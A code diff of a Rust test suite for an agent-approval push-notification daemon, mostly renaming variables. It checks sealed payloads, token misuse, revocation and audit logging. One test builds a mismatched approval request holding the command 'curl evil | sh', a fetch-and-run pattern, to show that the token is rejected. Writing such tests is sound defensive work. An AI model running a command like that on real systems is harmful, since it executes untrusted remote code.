@@ -111,10 +111,10 @@ impl FakeRelay {
 
     /// Asserts nothing arrives for `wait`.
     async fn quiet(&mut self, wait: Duration, why: &str) {
-        if let Ok(Some(r)) = tokio::time::timeout(wait, self.rx.recv()).await {
+        if let Ok(Some(received)) = tokio::time::timeout(wait, self.rx.recv()).await {
             panic!(
                 "unexpected push ({why}): {}",
-                String::from_utf8_lossy(&r.body)
+                String::from_utf8_lossy(&received.body)
             );
         }
     }
@@ -131,13 +131,13 @@ async fn start_at(
     bind: Option<std::net::SocketAddr>,
 ) -> Daemon {
     let url = relay.url.clone();
-    start_with(state, move |c| {
+    start_with(state, move |config| {
         if bind.is_some() {
-            c.bind = bind;
+            config.bind = bind;
         }
-        c.push.relay_url = url;
-        c.push.delay = Duration::from_millis(delay_ms);
-        c.push.backoff = Duration::from_millis(50);
+        config.push.relay_url = url;
+        config.push.delay = Duration::from_millis(delay_ms);
+        config.push.backoff = Duration::from_millis(50);
     })
     .await
 }
@@ -214,9 +214,9 @@ async fn device(ticket: &str, cap: &str, prefs: PushPrefs) -> Device {
 }
 
 /// Splits the attached session: returns (shown, hidden).
-async fn two_panes(c: &mut TestClient) -> (PaneId, PaneId) {
-    let shown = c.attach_and_follow().await;
-    let OpOutcome::PaneCreated { pane_id: hidden } = c
+async fn two_panes(client: &mut TestClient) -> (PaneId, PaneId) {
+    let shown = client.attach_and_follow().await;
+    let OpOutcome::PaneCreated { pane_id: hidden } = client
         .op(LayoutOp::Split {
             pane_id: shown,
             axis: Axis::Vertical,
@@ -226,13 +226,14 @@ async fn two_panes(c: &mut TestClient) -> (PaneId, PaneId) {
     else {
         panic!()
     };
-    c.client.set_view(Some(shown), vec![shown]);
+    client.client.set_view(Some(shown), vec![shown]);
     (shown, hidden)
 }
 
-fn verify(r: &Received, daemon: &Daemon) -> push::RelayRequest {
-    assert_eq!(r.path, "/v1/push");
-    let request = push::verify_request(&r.body, &r.signature).expect("signed by the daemon");
+fn verify(received: &Received, daemon: &Daemon) -> push::RelayRequest {
+    assert_eq!(received.path, "/v1/push");
+    let request =
+        push::verify_request(&received.body, &received.signature).expect("signed by the daemon");
     assert_eq!(request.daemon, push::hex(&daemon.daemon_id().0));
     request
 }
@@ -249,26 +250,27 @@ async fn approval_is_pushed_sealed_retried_and_answered_from_the_lock_screen() {
     let mut relay = FakeRelay::start().await;
     let daemon = start(state.path(), &relay, 200).await;
     let ticket_a = ticket(&daemon);
-    let a = device(&ticket_a, "cap-a", PushPrefs::default()).await;
+    let device_a = device(&ticket_a, "cap-a", PushPrefs::default()).await;
     // Another device shows one pane; the agent runs in the other, which nobody shows.
     let ticket_b = ticket(&daemon);
-    let mut b = TestClient::connect(&ticket_b, ClientConfig::generate_key());
-    let (_shown, hidden) = two_panes(&mut b).await;
+    let mut device_b = TestClient::connect(&ticket_b, ClientConfig::generate_key());
+    let (_shown, hidden) = two_panes(&mut device_b).await;
     // Device A's app went to the background.
-    a.client.client.set_view(None, vec![]);
+    device_a.client.client.set_view(None, vec![]);
 
     // The first attempt hits a relay error and is retried.
     relay.script.lock().unwrap().push(503);
     let mut payload: serde_json::Value = serde_json::from_str(PERMISSION).unwrap();
     payload["cwd"] = "/".into();
     let waiting = hook(&daemon, state.path(), hidden, "PermissionRequest", payload).await;
-    b.until("blocked agent", |c| {
-        c.metas
-            .get(&hidden)
-            .and_then(|m| m.agent.as_ref())
-            .is_some_and(|a| matches!(a.state, AgentState::Blocked(_)))
-    })
-    .await;
+    device_b
+        .until("blocked agent", |c| {
+            c.metas
+                .get(&hidden)
+                .and_then(|meta| meta.agent.as_ref())
+                .is_some_and(|agent| matches!(agent.state, AgentState::Blocked(_)))
+        })
+        .await;
 
     let first = verify(&relay.next("first attempt").await, &daemon);
     let second = verify(&relay.next("retry").await, &daemon);
@@ -282,7 +284,7 @@ async fn approval_is_pushed_sealed_retried_and_answered_from_the_lock_screen() {
     let body = String::from_utf8(relay_body(&second)).unwrap();
     assert!(!body.contains("node_modules"), "{body}");
 
-    let note = client_core::push::open_notification(&a.seal_secret, &second.sealed).unwrap();
+    let note = client_core::push::open_notification(&device_a.seal_secret, &second.sealed).unwrap();
     assert_eq!(note.kind, push::Kind::Approval);
     assert_eq!(note.pane, hidden.0);
     assert!(note.body.contains("rm -rf node_modules"), "{note:?}");
@@ -293,8 +295,10 @@ async fn approval_is_pushed_sealed_retried_and_answered_from_the_lock_screen() {
 
     // Another device cannot use A's token.
     let b_key = ClientConfig::generate_key();
-    let mut c = TestClient::connect(&ticket(&daemon), b_key.clone());
-    c.until("connected", |c| c.connected > 0).await;
+    let mut device_c = TestClient::connect(&ticket(&daemon), b_key.clone());
+    device_c
+        .until("connected", |device_c| device_c.connected > 0)
+        .await;
     let stolen = send_action(
         &ticket_a,
         options(&b_key),
@@ -327,7 +331,7 @@ async fn approval_is_pushed_sealed_retried_and_answered_from_the_lock_screen() {
     other.subject = push::request_subject("another", Some("Bash"), "curl evil | sh");
     let mismatched = send_action(
         &ticket_a,
-        options(&a.key),
+        options(&device_a.key),
         ConnectOptions::default(),
         push::issue_token(&seed, &other),
         Decision::Approve,
@@ -342,7 +346,7 @@ async fn approval_is_pushed_sealed_retried_and_answered_from_the_lock_screen() {
     // The lock-screen action: a one-shot connection with A's key.
     let decided = send_action(
         &ticket_a,
-        options(&a.key),
+        options(&device_a.key),
         ConnectOptions::default(),
         token.clone(),
         Decision::Approve,
@@ -351,7 +355,10 @@ async fn approval_is_pushed_sealed_retried_and_answered_from_the_lock_screen() {
     .await
     .expect("approved");
     assert_eq!(decided.pane_id, hidden);
-    assert_eq!(decided.decided_by.device.0.to_vec(), device_id(&a.key));
+    assert_eq!(
+        decided.decided_by.device.0.to_vec(),
+        device_id(&device_a.key)
+    );
     // The waiting hook got "allow".
     let answer = tokio::time::timeout(Duration::from_secs(10), waiting)
         .await
@@ -367,7 +374,7 @@ async fn approval_is_pushed_sealed_retried_and_answered_from_the_lock_screen() {
     // A second tap is refused.
     let again = send_action(
         &ticket_a,
-        options(&a.key),
+        options(&device_a.key),
         ConnectOptions::default(),
         token,
         Decision::Deny,
@@ -383,29 +390,32 @@ async fn approval_is_pushed_sealed_retried_and_answered_from_the_lock_screen() {
         ),
         "{again:?}"
     );
-    let list = a.client.client.attention_list().await.unwrap();
-    assert!(list.items.iter().all(|i| i.seen), "{list:#?}");
+    let list = device_a.client.client.attention_list().await.unwrap();
+    assert!(list.items.iter().all(|item| item.seen), "{list:#?}");
     // The lock-screen approval is in the signed audit log like an in-app one.
-    let page = a.client.client.audit(None, 100).await.unwrap();
+    let page = device_a.client.client.audit(None, 100).await.unwrap();
     assert!(page.chain_ok);
     let record = page
         .records
         .iter()
-        .find(|r| r.kind == proto::AuditKind::Approval)
+        .find(|record| record.kind == proto::AuditKind::Approval)
         .expect("approval audited");
     let approval = record.approval.as_ref().unwrap();
-    assert_eq!(record.actor.unwrap().device.0.to_vec(), device_id(&a.key));
+    assert_eq!(
+        record.actor.unwrap().device.0.to_vec(),
+        device_id(&device_a.key)
+    );
     assert!(grants::verify_signature(
         record.actor.unwrap().device,
         &approval.signed,
         &approval.sig
     ));
-    drop((a, b, c));
+    drop((device_a, device_b, device_c));
     daemon.shutdown().await;
 }
 
-fn relay_body(r: &push::RelayRequest) -> Vec<u8> {
-    serde_json::to_vec(r).unwrap()
+fn relay_body(request: &push::RelayRequest) -> Vec<u8> {
+    serde_json::to_vec(request).unwrap()
 }
 
 fn device_id(key: &[u8]) -> Vec<u8> {
@@ -421,8 +431,8 @@ async fn pushes_respect_viewing_seen_prefs_and_gone_tokens() {
         commands: false,
         ..PushPrefs::default()
     };
-    let mut a = device(&ticket(&daemon), "cap-a", prefs).await;
-    let (shown, hidden) = two_panes(&mut a.client).await;
+    let mut device_a = device(&ticket(&daemon), "cap-a", prefs).await;
+    let (shown, hidden) = two_panes(&mut device_a.client).await;
     let home = std::env::var("HOME").unwrap_or_else(|_| "/".into());
     let prompt = |name: &str| {
         serde_json::json!({
@@ -452,11 +462,11 @@ async fn pushes_respect_viewing_seen_prefs_and_gone_tokens() {
         .await;
 
     // 2. A backgrounded, but another device focuses the pane within the delay: seen, no push.
-    a.client.client.set_view(None, vec![]);
-    let mut b = TestClient::connect(&ticket(&daemon), ClientConfig::generate_key());
-    b.until("connected", |c| c.connected > 0).await;
-    b.client.attach(None);
-    b.until("layout", |c| c.layout.is_some()).await;
+    device_a.client.client.set_view(None, vec![]);
+    let mut device_b = TestClient::connect(&ticket(&daemon), ClientConfig::generate_key());
+    device_b.until("connected", |c| c.connected > 0).await;
+    device_b.client.attach(None);
+    device_b.until("layout", |c| c.layout.is_some()).await;
     hook(
         &daemon,
         state.path(),
@@ -466,13 +476,13 @@ async fn pushes_respect_viewing_seen_prefs_and_gone_tokens() {
     )
     .await;
     hook(&daemon, state.path(), hidden, "Stop", stop.clone()).await;
-    b.client.set_view(Some(hidden), vec![hidden]);
+    device_b.client.set_view(Some(hidden), vec![hidden]);
     relay
         .quiet(Duration::from_millis(1200), "item was seen")
         .await;
 
     // 3. Nobody looks: a "done" push, without actions.
-    b.client.set_view(Some(shown), vec![shown]);
+    device_b.client.set_view(Some(shown), vec![shown]);
     tokio::time::sleep(Duration::from_millis(100)).await;
     hook(
         &daemon,
@@ -483,9 +493,10 @@ async fn pushes_respect_viewing_seen_prefs_and_gone_tokens() {
     )
     .await;
     hook(&daemon, state.path(), hidden, "Stop", stop.clone()).await;
-    let r = verify(&relay.next("done push").await, &daemon);
-    assert_eq!(r.category, Some(push::Category::Done));
-    let note = client_core::push::open_notification(&a.seal_secret, &r.sealed).unwrap();
+    let request = verify(&relay.next("done push").await, &daemon);
+    assert_eq!(request.category, Some(push::Category::Done));
+    let note =
+        client_core::push::open_notification(&device_a.seal_secret, &request.sealed).unwrap();
     assert_eq!(note.kind, push::Kind::Done);
     assert_eq!(note.body, "All tests pass.");
     assert!(note.action.is_none());
@@ -504,7 +515,7 @@ async fn pushes_respect_viewing_seen_prefs_and_gone_tokens() {
     relay.next("push answered 410").await;
     let deadline = std::time::Instant::now() + Duration::from_secs(10);
     loop {
-        let status = a.client.client.push_status().await.unwrap();
+        let status = device_a.client.client.push_status().await.unwrap();
         if status.registered.is_none() {
             assert_eq!(status.devices, 0);
             break;
@@ -512,7 +523,7 @@ async fn pushes_respect_viewing_seen_prefs_and_gone_tokens() {
         assert!(std::time::Instant::now() < deadline, "still registered");
         tokio::time::sleep(Duration::from_millis(50)).await;
     }
-    drop((a, b));
+    drop((device_a, device_b));
     daemon.shutdown().await;
 }
 
@@ -521,8 +532,8 @@ async fn registrations_persist_and_bad_keys_are_refused() {
     let state = tempfile::tempdir().unwrap();
     let relay = FakeRelay::start().await;
     let daemon = start(state.path(), &relay, 100).await;
-    let mut a = device(&ticket(&daemon), "cap-a", PushPrefs::default()).await;
-    let bad = a
+    let mut device_a = device(&ticket(&daemon), "cap-a", PushPrefs::default()).await;
+    let bad = device_a
         .client
         .client
         .push_register(PushRegistration {
@@ -536,29 +547,32 @@ async fn registrations_persist_and_bad_keys_are_refused() {
     assert!(matches!(bad, Err(WsError::Invalid(_))), "{bad:?}");
     let ticket_text = ticket(&daemon);
     let bound = daemon.bound_sockets()[0];
-    drop(a.client);
+    drop(device_a.client);
     daemon.shutdown().await;
     assert!(state.path().join("push.json").exists());
 
     // Same address, so the ticket still dials it.
     let daemon = start_at(state.path(), &relay, 100, Some(bound)).await;
-    a.client = TestClient::connect(&ticket_text, a.key.clone());
-    a.client.until("connected", |c| c.connected > 0).await;
-    let status = a.client.client.push_status().await.unwrap();
+    device_a.client = TestClient::connect(&ticket_text, device_a.key.clone());
+    device_a
+        .client
+        .until("connected", |c| c.connected > 0)
+        .await;
+    let status = device_a.client.client.push_status().await.unwrap();
     assert_eq!(status.registered, Some(PushPrefs::default()));
-    let status = a.client.client.push_unregister().await.unwrap();
+    let status = device_a.client.client.push_unregister().await.unwrap();
     assert_eq!(status.registered, None);
-    drop(a);
+    drop(device_a);
     daemon.shutdown().await;
 }
 
 /// A Live Activity push the fake relay received, opened on the "device".
 fn activity(
-    r: &Received,
+    received: &Received,
     daemon: &Daemon,
     seal_secret: &[u8; 32],
 ) -> (push::RelayRequest, push::ActivityState) {
-    let request = verify(r, daemon);
+    let request = verify(received, daemon);
     assert_eq!(request.push_type, push::PushType::LiveActivity);
     assert_eq!(request.category, None, "the relay learns no category");
     let state = push::open(seal_secret, &request.sealed)
@@ -578,13 +592,13 @@ async fn live_activity_starts_updates_and_ends() {
     let state = tempfile::tempdir().unwrap();
     let mut relay = FakeRelay::start().await;
     let url = relay.url.clone();
-    let daemon = start_with(state.path(), move |c| {
-        c.push.relay_url = url;
-        c.push.delay = Duration::from_secs(600);
-        c.push.backoff = Duration::from_millis(50);
-        c.push.activity_debounce = Duration::from_millis(100);
-        c.push.activity_interval = Duration::from_millis(600);
-        c.push.activity_end_after = Duration::from_millis(1500);
+    let daemon = start_with(state.path(), move |config| {
+        config.push.relay_url = url;
+        config.push.delay = Duration::from_secs(600);
+        config.push.backoff = Duration::from_millis(50);
+        config.push.activity_debounce = Duration::from_millis(100);
+        config.push.activity_interval = Duration::from_millis(600);
+        config.push.activity_end_after = Duration::from_millis(1500);
     })
     .await;
     // No alert kinds: only the activity reaches the relay.
@@ -596,10 +610,11 @@ async fn live_activity_starts_updates_and_ends() {
         commands: false,
     };
     let key = ClientConfig::generate_key();
-    let mut a = TestClient::connect(&ticket(&daemon), key);
-    a.until("connected", |c| c.connected > 0).await;
+    let mut device_a = TestClient::connect(&ticket(&daemon), key);
+    device_a.until("connected", |c| c.connected > 0).await;
     assert!(
-        a.client
+        device_a
+            .client
             .daemon_info()
             .expect("daemon info")
             .features
@@ -607,10 +622,11 @@ async fn live_activity_starts_updates_and_ends() {
         "the daemon offers Live Activities"
     );
     // Before registering for push, an activity token is refused.
-    let early = a.client.push_activity(Some("u".into())).await;
+    let early = device_a.client.push_activity(Some("u".into())).await;
     assert!(matches!(early, Err(WsError::NotFound(_))), "{early:?}");
     let (seal_secret, seal_public) = client_core::push::x25519_keypair();
-    a.client
+    device_a
+        .client
         .push_register(PushRegistration {
             cap: "alert-cap".into(),
             seal_key: seal_public,
@@ -620,7 +636,7 @@ async fn live_activity_starts_updates_and_ends() {
         })
         .await
         .unwrap();
-    let (shown, hidden) = two_panes(&mut a).await;
+    let (shown, hidden) = two_panes(&mut device_a).await;
     let home = std::env::var("HOME").unwrap_or_else(|_| "/".into());
     let prompt = serde_json::json!({
         "session_id": "s", "cwd": home, "hook_event_name": "UserPromptSubmit", "prompt": "go",
@@ -642,56 +658,77 @@ async fn live_activity_starts_updates_and_ends() {
         prompt.clone(),
     )
     .await;
-    let (start, s) = activity(&relay.next("push-to-start").await, &daemon, &seal_secret);
+    let (start, activity_state) =
+        activity(&relay.next("push-to-start").await, &daemon, &seal_secret);
     assert_eq!(start.cap, "start-cap");
     assert_eq!(start.event, Some(push::ActivityEvent::Start));
     assert!(!start.urgent);
     assert!(start.stale.is_some());
-    assert_eq!((s.running, s.blocked, s.done), (1, 0, 0));
-    assert!(s.headline.contains("claude"), "{s:?}");
+    assert_eq!(
+        (
+            activity_state.running,
+            activity_state.blocked,
+            activity_state.done
+        ),
+        (1, 0, 0)
+    );
+    assert!(
+        activity_state.headline.contains("claude"),
+        "{activity_state:?}"
+    );
     // Not started twice in the same busy spell (the app has not reported the activity yet).
     relay
         .quiet(Duration::from_millis(800), "already started")
         .await;
 
     // 2. The app reports the started activity's token: the current state goes there at once.
-    a.client
+    device_a
+        .client
         .push_activity(Some("update-cap".into()))
         .await
         .unwrap();
-    let (update, s) = activity(&relay.next("first update").await, &daemon, &seal_secret);
+    let (update, activity_state) =
+        activity(&relay.next("first update").await, &daemon, &seal_secret);
     assert_eq!(update.cap, "update-cap");
     assert_eq!(update.event, Some(push::ActivityEvent::Update));
-    assert_eq!((s.running, s.blocked), (1, 0));
+    assert_eq!((activity_state.running, activity_state.blocked), (1, 0));
 
     // 3. The agent asks for approval: an urgent update right away.
     let mut payload: serde_json::Value = serde_json::from_str(PERMISSION).unwrap();
     payload["cwd"] = "/".into();
     let waiting = hook(&daemon, state.path(), hidden, "PermissionRequest", payload).await;
-    let (blocked, s) = activity(&relay.next("needs you").await, &daemon, &seal_secret);
+    let (blocked, activity_state) = activity(&relay.next("needs you").await, &daemon, &seal_secret);
     assert_eq!(blocked.event, Some(push::ActivityEvent::Update));
     assert!(blocked.urgent, "needing the user is high priority");
-    assert_eq!(s.blocked, 1);
-    assert!(s.headline.contains("node_modules"), "{s:?}");
+    assert_eq!(activity_state.blocked, 1);
+    assert!(
+        activity_state.headline.contains("node_modules"),
+        "{activity_state:?}"
+    );
     // The relay sees ciphertext only.
     let body = String::from_utf8(relay_body(&blocked)).unwrap();
     assert!(!body.contains("node_modules"), "{body}");
 
     // 4. Approved, it works on and finishes: routine updates (done, nothing running), then
     //    the end once idle.
-    a.until("blocked agent", |c| {
-        c.metas
-            .get(&hidden)
-            .and_then(|m| m.agent.as_ref())
-            .is_some_and(|a| matches!(a.state, AgentState::Blocked(_)))
-    })
-    .await;
-    let Some(AgentState::Blocked(blocker)) =
-        a.metas[&hidden].agent.as_ref().map(|a| a.state.clone())
+    device_a
+        .until("blocked agent", |c| {
+            c.metas
+                .get(&hidden)
+                .and_then(|meta| meta.agent.as_ref())
+                .is_some_and(|agent| matches!(agent.state, AgentState::Blocked(_)))
+        })
+        .await;
+    let Some(AgentState::Blocked(blocker)) = device_a.metas[&hidden]
+        .agent
+        .as_ref()
+        .map(|agent| agent.state.clone())
     else {
         unreachable!()
     };
-    a.client.decide(blocker.request_id, blocker.options[0].id);
+    device_a
+        .client
+        .decide(blocker.request_id, blocker.options[0].id);
     tokio::time::timeout(Duration::from_secs(10), waiting)
         .await
         .expect("hook answered")
@@ -705,27 +742,36 @@ async fn live_activity_starts_updates_and_ends() {
         prompt.clone(),
     )
     .await;
-    a.until("working again", |c| {
-        c.metas
-            .get(&hidden)
-            .and_then(|m| m.agent.as_ref())
-            .is_some_and(|a| a.state == AgentState::Running)
-    })
-    .await;
+    device_a
+        .until("working again", |c| {
+            c.metas
+                .get(&hidden)
+                .and_then(|meta| meta.agent.as_ref())
+                .is_some_and(|agent| agent.state == AgentState::Running)
+        })
+        .await;
     hook(&daemon, state.path(), hidden, "Stop", stop.clone()).await;
     let mut finished = None;
     while finished.is_none() {
-        let (r, s) = activity(&relay.next("finished").await, &daemon, &seal_secret);
-        assert_eq!(r.cap, "update-cap");
-        assert_eq!(r.event, Some(push::ActivityEvent::Update), "{s:?}");
+        let (update, activity_state) =
+            activity(&relay.next("finished").await, &daemon, &seal_secret);
+        assert_eq!(update.cap, "update-cap");
+        assert_eq!(
+            update.event,
+            Some(push::ActivityEvent::Update),
+            "{activity_state:?}"
+        );
         // The agent's state and its "finished" item may arrive as two routine updates.
-        if s.running + s.blocked == 0 && s.done == 1 {
-            assert!(!r.urgent);
-            finished = Some(s);
+        if activity_state.running + activity_state.blocked == 0 && activity_state.done == 1 {
+            assert!(!update.urgent);
+            finished = Some(activity_state);
         }
     }
-    let s = finished.unwrap();
-    assert!(s.headline.contains("All tests pass."), "{s:?}");
+    let activity_state = finished.unwrap();
+    assert!(
+        activity_state.headline.contains("All tests pass."),
+        "{activity_state:?}"
+    );
     let (end, _) = activity(&relay.next("end").await, &daemon, &seal_secret);
     assert_eq!(end.event, Some(push::ActivityEvent::End));
     assert_eq!(end.cap, "update-cap");
@@ -734,7 +780,7 @@ async fn live_activity_starts_updates_and_ends() {
 
     // 5. The ended activity's token is forgotten: the next busy spell starts a new one, and
     //    a gone push-to-start token is dropped.
-    a.client.set_view(Some(shown), vec![shown]);
+    device_a.client.set_view(Some(shown), vec![shown]);
     relay.script.lock().unwrap().push(410);
     hook(
         &daemon,
@@ -756,7 +802,8 @@ async fn live_activity_starts_updates_and_ends() {
 
     // 6. Registered again with a fresh start token, and the user dismissed the activity
     //    (`None`): no start until the agents go idle and busy again.
-    a.client
+    device_a
+        .client
         .push_register(PushRegistration {
             cap: "alert-cap".into(),
             seal_key: seal_public,
@@ -766,7 +813,7 @@ async fn live_activity_starts_updates_and_ends() {
         })
         .await
         .unwrap();
-    a.client.push_activity(None).await.unwrap();
+    device_a.client.push_activity(None).await.unwrap();
     relay
         .quiet(Duration::from_millis(800), "dismissed by the user")
         .await;
@@ -778,7 +825,7 @@ async fn live_activity_starts_updates_and_ends() {
     hook(&daemon, state.path(), hidden, "UserPromptSubmit", prompt).await;
     let (third, _) = activity(&relay.next("third start").await, &daemon, &seal_secret);
     assert_eq!(third.cap, "start-cap-2");
-    drop(a);
+    drop(device_a);
     daemon.shutdown().await;
 }
 
@@ -799,9 +846,9 @@ async fn local_dev_relay_end_to_end() {
     let http = reqwest::Client::new();
     let state = tempfile::tempdir().unwrap();
     let url = relay_url.clone();
-    let daemon = start_with(state.path(), move |c| {
-        c.push.relay_url = url;
-        c.push.delay = Duration::from_millis(200);
+    let daemon = start_with(state.path(), move |config| {
+        config.push.relay_url = url;
+        config.push.delay = Duration::from_millis(200);
     })
     .await;
 
@@ -826,9 +873,9 @@ async fn local_dev_relay_end_to_end() {
         .unwrap();
     let cap = reg["cap"].as_str().expect("a capability").to_owned();
     // ...and hand it to the daemon.
-    let mut a = device(&ticket(&daemon), &cap, PushPrefs::default()).await;
-    let (_shown, hidden) = two_panes(&mut a.client).await;
-    a.client.client.set_view(None, vec![]);
+    let mut device_a = device(&ticket(&daemon), &cap, PushPrefs::default()).await;
+    let (_shown, hidden) = two_panes(&mut device_a.client).await;
+    device_a.client.client.set_view(None, vec![]);
     let home = std::env::var("HOME").unwrap();
     let prompt = serde_json::json!({
         "session_id": "s", "cwd": home, "hook_event_name": "UserPromptSubmit", "prompt": "go",
@@ -852,8 +899,11 @@ async fn local_dev_relay_end_to_end() {
             .await
             .unwrap();
         let log: Vec<serde_json::Value> = serde_json::from_str(&text).unwrap();
-        if let Some(e) = log.into_iter().find(|e| e["token"] == apns_token.as_str()) {
-            break e;
+        if let Some(entry) = log
+            .into_iter()
+            .find(|entry| entry["token"] == apns_token.as_str())
+        {
+            break entry;
         }
         assert!(
             std::time::Instant::now() < deadline,
@@ -865,9 +915,9 @@ async fn local_dev_relay_end_to_end() {
     assert_eq!(entry["payload"]["aps"]["mutable-content"], 1);
     assert_eq!(entry["payload"]["aps"]["category"], "AGENT_DONE");
     let sealed = entry["payload"]["s"].as_str().unwrap();
-    let note = client_core::push::open_notification(&a.seal_secret, sealed).unwrap();
+    let note = client_core::push::open_notification(&device_a.seal_secret, sealed).unwrap();
     assert_eq!(note.body, "Done via wrangler dev.");
-    drop(a);
+    drop(device_a);
     daemon.shutdown().await;
 }
 
@@ -916,8 +966,11 @@ async fn apns_entry(
             .await
             .unwrap();
         let log: Vec<serde_json::Value> = serde_json::from_str(&text).unwrap();
-        if let Some(e) = log.into_iter().find(|e| e["token"] == token && matches(e)) {
-            return e;
+        if let Some(entry) = log
+            .into_iter()
+            .find(|entry| entry["token"] == token && matches(entry))
+        {
+            return entry;
         }
         assert!(
             std::time::Instant::now() < deadline,
@@ -947,21 +1000,22 @@ async fn local_dev_relay_live_activity() {
     let http = reqwest::Client::new();
     let state = tempfile::tempdir().unwrap();
     let url = relay_url.clone();
-    let daemon = start_with(state.path(), move |c| {
-        c.push.relay_url = url;
-        c.push.delay = Duration::from_secs(600);
-        c.push.activity_debounce = Duration::from_millis(100);
-        c.push.activity_interval = Duration::from_millis(500);
-        c.push.activity_end_after = Duration::from_secs(2);
+    let daemon = start_with(state.path(), move |config| {
+        config.push.relay_url = url;
+        config.push.delay = Duration::from_secs(600);
+        config.push.activity_debounce = Duration::from_millis(100);
+        config.push.activity_interval = Duration::from_millis(500);
+        config.push.activity_end_after = Duration::from_secs(2);
     })
     .await;
     let (alert_token, start_token, update_token) = (random_token(), random_token(), random_token());
     let cap = relay_cap(&http, &relay_url, &daemon, &alert_token, "alert").await;
     let start_cap = relay_cap(&http, &relay_url, &daemon, &start_token, "activity").await;
-    let mut a = TestClient::connect(&ticket(&daemon), ClientConfig::generate_key());
-    a.until("connected", |c| c.connected > 0).await;
+    let mut device_a = TestClient::connect(&ticket(&daemon), ClientConfig::generate_key());
+    device_a.until("connected", |c| c.connected > 0).await;
     let (seal_secret, seal_public) = client_core::push::x25519_keypair();
-    a.client
+    device_a
+        .client
         .push_register(PushRegistration {
             cap,
             seal_key: seal_public,
@@ -971,7 +1025,7 @@ async fn local_dev_relay_live_activity() {
         })
         .await
         .unwrap();
-    let (_shown, hidden) = two_panes(&mut a).await;
+    let (_shown, hidden) = two_panes(&mut device_a).await;
     let home = std::env::var("HOME").unwrap();
     let prompt = serde_json::json!({
         "session_id": "s", "cwd": home, "hook_event_name": "UserPromptSubmit", "prompt": "go",
@@ -1003,9 +1057,13 @@ async fn local_dev_relay_live_activity() {
 
     // The app reports the started activity's own token.
     let update_cap = relay_cap(&http, &relay_url, &daemon, &update_token, "activity").await;
-    a.client.push_activity(Some(update_cap)).await.unwrap();
-    let update = apns_entry(&http, &apns_log, &update_token, |e| {
-        e["payload"]["aps"]["event"] == "update"
+    device_a
+        .client
+        .push_activity(Some(update_cap))
+        .await
+        .unwrap();
+    let update = apns_entry(&http, &apns_log, &update_token, |entry| {
+        entry["payload"]["aps"]["event"] == "update"
     })
     .await;
     assert_eq!(open(&update).running, 1);
@@ -1016,13 +1074,13 @@ async fn local_dev_relay_live_activity() {
         "last_assistant_message": "Done via wrangler dev.",
     });
     hook(&daemon, state.path(), hidden, "Stop", stop).await;
-    let end = apns_entry(&http, &apns_log, &update_token, |e| {
-        e["payload"]["aps"]["event"] == "end"
+    let end = apns_entry(&http, &apns_log, &update_token, |entry| {
+        entry["payload"]["aps"]["event"] == "end"
     })
     .await;
     assert_eq!(open(&end).running, 0);
     assert!(end["payload"]["aps"]["dismissal-date"].is_u64());
-    drop(a);
+    drop(device_a);
     daemon.shutdown().await;
 }
 
@@ -1046,16 +1104,17 @@ async fn a_revoked_device_gets_no_more_pushes() {
     let state = tempfile::tempdir().unwrap();
     let mut relay = FakeRelay::start().await;
     let daemon = start(state.path(), &relay, 200).await;
-    let a = device(&ticket(&daemon), "cap-a", PushPrefs::default()).await;
-    let mut b = TestClient::connect(&ticket(&daemon), ClientConfig::generate_key());
-    let (_shown, hidden) = two_panes(&mut b).await;
-    a.client.client.set_view(None, vec![]);
+    let device_a = device(&ticket(&daemon), "cap-a", PushPrefs::default()).await;
+    let mut device_b = TestClient::connect(&ticket(&daemon), ClientConfig::generate_key());
+    let (_shown, hidden) = two_panes(&mut device_b).await;
+    device_a.client.client.set_view(None, vec![]);
     finish_turn(&daemon, state.path(), hidden).await;
     let before = verify(&relay.next("push before revoking").await, &daemon);
     assert_eq!(before.cap, "cap-a");
 
-    let a_device = proto::DeviceId(device_id(&a.key).try_into().unwrap());
-    b.client
+    let a_device = proto::DeviceId(device_id(&device_a.key).try_into().unwrap());
+    device_b
+        .client
         .revoke(client_core::proto::RevokeTarget::Device(a_device))
         .await
         .unwrap();
@@ -1065,7 +1124,7 @@ async fn a_revoked_device_gets_no_more_pushes() {
     relay
         .quiet(Duration::from_millis(1500), "the device was revoked")
         .await;
-    drop((a, b));
+    drop((device_a, device_b));
     daemon.shutdown().await;
 }
 
@@ -1077,22 +1136,22 @@ async fn action_tokens_decide_only_their_own_live_request() {
     let mut relay = FakeRelay::start().await;
     let daemon = start(state.path(), &relay, 200).await;
     let ticket_a = ticket(&daemon);
-    let a = device(&ticket_a, "cap-a", PushPrefs::default()).await;
-    let mut b = TestClient::connect(&ticket(&daemon), ClientConfig::generate_key());
-    let (shown, hidden) = two_panes(&mut b).await;
-    a.client.client.set_view(None, vec![]);
+    let device_a = device(&ticket_a, "cap-a", PushPrefs::default()).await;
+    let mut device_b = TestClient::connect(&ticket(&daemon), ClientConfig::generate_key());
+    let (shown, hidden) = two_panes(&mut device_b).await;
+    device_a.client.client.set_view(None, vec![]);
     let mut payload: serde_json::Value = serde_json::from_str(PERMISSION).unwrap();
     payload["cwd"] = "/".into();
     let waiting = hook(&daemon, state.path(), hidden, "PermissionRequest", payload).await;
     let pushed = verify(&relay.next("approval push").await, &daemon);
-    let note = client_core::push::open_notification(&a.seal_secret, &pushed.sealed).unwrap();
+    let note = client_core::push::open_notification(&device_a.seal_secret, &pushed.sealed).unwrap();
     let token = client_core::push::token_bytes(&note.action.unwrap()).unwrap();
     let seed: [u8; 32] = std::fs::read(state.path().join("daemon.key"))
         .unwrap()
         .try_into()
         .unwrap();
     let real = push::verify_token(&daemon.daemon_id().0, &token, proto::UnixMillis(0)).unwrap();
-    let key = a.key.clone();
+    let key = device_a.key.clone();
     let act = async |ticket: &str, token: Vec<u8>| {
         send_action(
             ticket,
@@ -1104,7 +1163,7 @@ async fn action_tokens_decide_only_their_own_live_request() {
         )
         .await
     };
-    let refused = |r: &Result<proto::Decided, ActionError>, denied: bool| match r {
+    let refused = |result: &Result<proto::Decided, ActionError>, denied: bool| match result {
         Err(ActionError::Rejected(WsError::Denied(_))) => denied,
         Err(ActionError::Rejected(WsError::NotFound(_))) => !denied,
         _ => false,
@@ -1112,48 +1171,48 @@ async fn action_tokens_decide_only_their_own_live_request() {
     let sign = |t: &push::ActionToken| push::issue_token(&seed, t);
 
     // Signed by another daemon, naming this one.
-    let r = act(&ticket_a, push::issue_token(&[9; 32], &real)).await;
-    assert!(refused(&r, true), "foreign signer: {r:?}");
+    let result = act(&ticket_a, push::issue_token(&[9; 32], &real)).await;
+    assert!(refused(&result, true), "foreign signer: {result:?}");
     let expired = push::ActionToken {
         expires: proto::UnixMillis(1),
         ..real.clone()
     };
